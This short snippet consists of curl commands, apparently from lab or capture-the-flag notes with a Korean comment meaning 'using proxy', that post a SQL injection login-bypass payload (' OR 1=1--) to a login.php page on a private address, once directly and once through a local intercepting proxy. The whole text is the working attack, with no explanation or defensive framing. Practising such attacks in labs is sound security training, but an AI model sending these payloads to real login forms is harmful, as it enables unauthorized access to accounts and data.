```bash
curl -X POST http://10.10.184.121/login.php \
 -H "User-Agent: Mozilla/5.0" \
 -H "Content-Type: application/x-www-form-urlencoded" \
 --data-urlencode "username=' OR 1=1--" \
 --data-urlencode "password=anything"
```

```bash
# 프록시 사용
curl -x 127.0.0.1:8080 -X POST http://10.10.184.121/login.php \
  -H "User-Agent: Mozilla/5.0" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=' OR 1=1-- -" \
  --data-urlencode "password=123" \
  --http1.1

curl -x 127.0.0.1:8080 http://10.10.184.121/login.php
```
